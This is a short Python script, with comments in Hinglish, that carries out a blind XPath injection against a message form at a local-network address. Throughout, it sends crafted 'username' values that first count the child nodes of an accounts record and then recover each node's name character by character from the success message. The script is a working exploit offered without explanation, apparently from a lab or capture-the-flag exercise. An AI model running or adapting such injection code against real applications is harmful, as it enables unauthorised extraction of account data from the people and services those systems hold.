import requests, re

url = "http://192.168.0.100:8000/message"
chars = 'abcdefghijklmnopqrstuvwxyz'

# Pehle count karo kitne children hain
for num in range(1, 10):
    r = requests.post(url, data={'username':f"invalid' or count(/accounts/*[1]/*)={num} and '1'='1",'msg':'test'})
    if 'Message successfully sent!' in r.text:
        child_count = num
        print(f"Total children: {child_count}")
        break

# Har child ka naam nikalo
for child_pos in range(1, child_count+1):
    childName = ''
    for i in range(1, 15):  # max 15 char length
        for c in chars:
            r = requests.post(url, data={'username':f"invalid' or substring(name(/accounts/*[1]/*[{child_pos}]),{i},1)='{c}' and '1'='1",'msg':'test'})
            if 'Message successfully sent!' in r.text:
                childName += c
                break
        else:
            break
    print(f"Child {child_pos}: {childName}")
